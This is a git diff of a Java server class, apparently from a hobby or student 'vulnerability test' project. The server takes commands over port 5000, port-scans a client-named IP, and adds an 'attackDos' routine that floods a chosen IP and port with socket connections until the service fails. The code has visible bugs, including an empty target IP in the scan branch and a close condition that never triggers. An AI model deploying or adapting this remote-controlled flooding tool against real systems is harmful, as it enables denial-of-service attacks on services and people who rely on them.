@@ -12,14 +12,12 @@ import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.UnknownHostException;
+import java.util.Random;
 import java.util.concurrent.TimeUnit;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
-/**
- *
- * @author patri
- */
+
 public class TesteVunerabilidadeServer extends Thread{
 
     private Socket clientConnection = null;
@@ -31,15 +29,10 @@ public class TesteVunerabilidadeServer extends Thread{
     }
     
     public static void main(String[] args) throws IOException, InterruptedException  {
-        
-            //BufferedReader clientReceiver = new BufferedReader(new InputStreamReader(clientConnection.getInputStream()));
-            //PrintWriter clientSender = new PrintWriter(clientConnection.getOutputStream(),true);
-           
+
             try {
             //Criar um processo à escuta numa porta
-             ServerSocket listener = new ServerSocket(5000);
-            
-            
+            ServerSocket listener = new ServerSocket(5000);
             while(true){ 
             System.out.println("Esperando client se ligar...");
             Socket clientConnection = listener.accept();
@@ -52,33 +45,53 @@ public class TesteVunerabilidadeServer extends Thread{
             
         } catch (IOException ex) {
             Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
-        }
-                
-   
-               
+        }      
     } 
     @Override
     public void run()        
     {
-    
         try {
             //criar canal de input
             BufferedReader clientReceiver = new BufferedReader(new InputStreamReader(clientConnection.getInputStream()));
             //Criar um canal de saida
             PrintStream clientSender = new PrintStream (clientConnection.getOutputStream());
         
-            String ipTargetReceived = null;
-            ipTargetReceived = clientReceiver.readLine();
+            String dataFromClient = null;
+            dataFromClient = clientReceiver.readLine();
             
-            try {
-                portScan(ipTargetReceived, clientSender);
+            
+            String testType = dataFromClient.substring(0,4);
+            System.out.println("testType: "+testType);
+            
+            if(testType.equalsIgnoreCase("<PS>")){
+                String ipTarget = testType.substring(testType.indexOf(">")+1,testType.length());
+                System.out.println("ipTarget: "+ ipTarget);
+                try {
+                portScan(ipTarget, clientSender);
             } catch (InterruptedException ex) {
+                Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
+            }            
+            
+            }
+            else if(testType.equalsIgnoreCase("<DS>"))
+            {
+                String ipTarget = dataFromClient.substring(dataFromClient.indexOf(">")+1,dataFromClient.indexOf("|"));
+                
+                String portTarget = dataFromClient.substring(dataFromClient.indexOf("|")+1,dataFromClient.length());
+                System.out.println("portTarget"+portTarget);
+                
+                
+                try{
+                attackDos(ipTarget,portTarget,clientSender);
+                 }catch (InterruptedException ex) {
                 Logger.getLogger(TesteVunerabilidadeServer.class.getName()).log(Level.SEVERE, null, ex);
             }
             
-             clientReceiver.close();
-             clientSender.close();
-             clientConnection.close();
+            }
+    
+            clientReceiver.close();
+            clientSender.close();
+            clientConnection.close(); 
         } 
              
         catch (IOException ex) {
@@ -86,24 +99,46 @@ public class TesteVunerabilidadeServer extends Thread{
         } 
        }
     
-    
-    
-    
     public void portScan(String ipClientTarget, PrintStream sendToClient) throws InterruptedException{
-            for(int x=100; x<=137; x++){        
-                try {
-                    TimeUnit.SECONDS.sleep(1/1000);
-                    Socket targetSocket = new Socket(ipClientTarget, x);
-                    
-                    sendToClient.println("Porta: " + x + " está aberta");
-                   
-                    targetSocket.close();
-                } catch (IOException ex) {
-                
-                 sendToClient.println("Porta: " + x + " está fechada");     
+        for(int x=100; x<=137; x++){        
+            try {
+                TimeUnit.SECONDS.sleep(1/1000);
+                Socket targetSocket = new Socket(ipClientTarget, x);    
+                sendToClient.println("Porta: " + x + " está aberta");
+                targetSocket.close();
+            } catch (IOException ex) {
+                sendToClient.println("Porta: " + x + " está fechada");    
                 }
-    
+        }
     }
+    public void attackDos(String ipClientTarget, String servicePort, PrintStream sendToClient) throws InterruptedException
+    {
+        
+        Random aleatorio = new Random();
+        int attempts = aleatorio.nextInt((10000 - 1000) + 1) + 1000;
+        // gerar um numero randomico
+        while(true){
+            try {
+                for(int i=0;i<attempts;i++){
+                TimeUnit.SECONDS.sleep(1/1000);
+                Socket targetSocket = new Socket(ipClientTarget, Integer.parseInt(servicePort));
+                Thread attackDos = new TesteVunerabilidadeServer(targetSocket);
+                attackDos.start();
+              
+                    if(i==attempts){
+                        targetSocket.close();
+                    }
+                
+                }
+                
+            } catch (IOException ex) {
+                sendToClient.println("Número de conexões máxima atingida!!!!!!");
+                sendToClient.println("O numero de tentativas até o serviço cair foram:  "+ attempts);
+                break;
+            }
+        }
+        
+     
     }
     
     
